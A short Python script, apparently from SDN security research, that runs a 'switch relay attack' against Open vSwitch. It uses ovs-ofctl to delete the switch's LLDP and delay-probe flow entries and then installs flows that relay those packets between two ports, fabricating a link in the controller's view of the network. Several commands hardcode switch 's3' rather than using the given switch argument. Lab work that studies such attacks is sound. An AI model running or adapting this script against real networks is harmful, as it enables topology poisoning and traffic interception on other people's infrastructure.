import os 
from optparse import OptionParser
'''
To raise switch relay attack, could take 2 steps:
1. remove probing flow entry from target switch.
Since we isolate the procedure of link discovery and delay probing,
2. install redirection flow entry with defined in-out rules. 

thus we should remove both lldp and probing rules. 
'''
PROBE_WITH_DST_IP = '1.1.1.1'

def switch_relay_attack(sw, in_port, out_port):
    # step 1
    command1 = 'ovs-ofctl del-flows {} dl_type=0x88cc'
    os.system(command1.format(sw))
    command2 = 'ovs-ofctl del-flows {} ip,nw_dst={}'
    os.system(command2.format(sw, PROBE_WITH_DST_IP))
    # step 2
    command3 = 'ovs-ofctl add-flow s3 ip,nw_dst={},in_port={},actions=output:controller,{}'
    os.system(command3.format(PROBE_WITH_DST_IP, in_port, out_port))
    # reverse the forwarding port
    os.system(command3.format(PROBE_WITH_DST_IP, out_port, in_port))
    command4 = 'ovs-ofctl add-flow s3 dl_type=0x88cc,in_port={},actions=output:{}'
    os.system(command4.format(in_port, out_port))
    # reverse the forwarding port
    os.system(command4.format(out_port, in_port))

    
if __name__ == '__main__':
    prompt = '''usage: %prog -s switch -i in_port -o out_port.'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-s', '--switch', dest='switch', type="str")
    parser.add_option('-i', '--in_port', dest='in_port', type="int")
    parser.add_option('-o', '--out_port', dest='out_port', type="int")
    (options, args) = parser.parse_args()
    switch_relay_attack(options.switch, options.in_port, options.out_port)